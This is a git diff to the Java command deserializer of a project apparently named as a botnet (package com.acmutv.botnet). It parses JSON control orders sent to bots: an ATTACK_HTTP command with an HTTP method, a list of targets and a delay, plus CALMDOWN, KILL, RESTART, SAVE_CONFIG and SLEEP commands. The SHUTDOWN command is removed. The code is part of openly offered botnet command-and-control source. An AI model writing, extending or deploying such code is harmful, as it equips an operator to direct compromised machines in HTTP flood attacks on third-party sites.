@@ -32,7 +32,6 @@ import com.acmutv.botnet.tool.string.TemplateEngine;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.core.control.command.CommandScope;
 import com.acmutv.botnet.core.target.HttpTarget;
-import com.acmutv.botnet.tool.time.Duration;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonParser;
 import com.fasterxml.jackson.databind.DeserializationContext;
@@ -42,6 +41,7 @@ import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
 import java.io.IOException;
 import java.net.URL;
 import java.util.*;
+import java.util.concurrent.TimeUnit;
 
 /**
  * This class realizes the JSON deserializer for {@link BotCommand}.
@@ -96,12 +96,65 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
 
       switch (cmd.getScope()) {
 
+        case ATTACK_HTTP:
+          if (!node.has("method") || !node.has("targets")) {
+            throw new IOException("Cannot read parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
+          }
+          final HttpMethod httpMethod = HttpMethod.from(node.get("method").asText());
+          final List<HttpTarget> httpTargets = parseTargets(node.get("targets"));
+
+          cmd.getParams().put("method", httpMethod);
+          cmd.getParams().put("targets", httpTargets);
+
+          if (node.hasNonNull("delay")) {
+            final Interval attackHttpDelay = Interval.valueOf(node.get("delay").asText());
+            cmd.getParams().put("delay", attackHttpDelay);
+          }
+
+          break;
+
+        case CALMDOWN:
+          if (node.hasNonNull("delay")) {
+            final Interval calmdownDelay = Interval.valueOf(node.get("delay").asText());
+            cmd.getParams().put("delay", calmdownDelay);
+          }
+
+          break;
+
+        case KILL:
+          if (node.hasNonNull("timeout")) {
+            final Interval killTimeout = Interval.valueOf(node.get("timeout").asText());
+            cmd.getParams().put("timeout", killTimeout);
+          }
+
+          if (node.hasNonNull("delay")) {
+            final Interval killDelay = Interval.valueOf(node.get("delay").asText());
+            cmd.getParams().put("delay", killDelay);
+          }
+
+          break;
+
         case RESTART:
           if (!node.has("resource")) {
             throw new IOException("Cannot read parameter [resource] for scope [RESTART] (missing)");
           }
           final String resource = TemplateEngine.getInstance().replace(node.get("resource").asText());
+
           cmd.getParams().put("resource", resource);
+
+          if (node.hasNonNull("delay")) {
+            final Interval restartDelay = Interval.valueOf(node.get("delay").asText());
+            cmd.getParams().put("delay", restartDelay);
+          }
+
+          break;
+
+        case SAVE_CONFIG:
+          if (node.hasNonNull("delay")) {
+            final Interval saveConfigDelay = Interval.valueOf(node.get("delay").asText());
+            cmd.getParams().put("delay", saveConfigDelay);
+          }
+
           break;
 
         case SLEEP:
@@ -109,25 +162,13 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
             throw new IOException("Cannot read parameter [timeout] for scope [SLEEP] (missing)");
           }
           final Interval sleepTimeout = Interval.valueOf(node.get("timeout").asText());
+
           cmd.getParams().put("timeout", sleepTimeout);
-          break;
 
-        case SHUTDOWN:
-          if (!node.has("timeout")) {
-            throw new IOException("Cannot read parameter [timeout] for scope [SHUTDOWN] (missing)");
+          if (node.hasNonNull("delay")) {
+            final Interval sleepDelay = Interval.valueOf(node.get("delay").asText());
+            cmd.getParams().put("delay", sleepDelay);
           }
-          final Duration shutdownTimeout = Duration.valueOf(node.get("timeout").asText());
-          cmd.getParams().put("timeout", shutdownTimeout);
-          break;
-
-        case ATTACK_HTTP:
-          if (!node.has("method") || !node.has("targets")) {
-            throw new IOException("Cannot read parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
-          }
-          final HttpMethod httpMethod = HttpMethod.from(node.get("method").asText());
-          final List<HttpTarget> httpTargets = parseTargets(node.get("targets"));
-          cmd.getParams().put("method", httpMethod);
-          cmd.getParams().put("targets", httpTargets);
           break;
 
         default:
